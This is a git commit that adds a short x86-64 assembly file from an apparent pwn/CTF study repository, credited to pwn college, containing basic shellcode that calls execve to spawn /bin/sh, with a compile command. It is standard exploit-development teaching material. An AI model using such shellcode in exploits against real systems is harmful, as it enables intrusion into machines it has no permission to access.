bdd80d3cd625b9f894eae00e7c0393a5a98f2cdf
alimuhammadsecured <164618346+BestDevOfc@users.noreply.github.com>
2024-10-03 06:20:22 -0400

    Add files via upload

---
+++ Pwn/Shellcode/shell_simple.s
@@ -0,0 +1,13 @@
+# credits: pwn college
+# to compile: gcc -nostdlib -static shellcode.s -o shellcode-elf
+.global _start
+_start:
+.intel_syntax noprefix
+    mov rax, 59             # syscall for execve is 59 
+    lea rdi, [rip+binsh]    # into the first argument passing in "/bin/sh"
+    mov rsi, 0              # NULL for second argument
+    mov rdx, 0              # NULL for third argument
+    syscall
+
+binsh:
+    .string "/bin/sh"
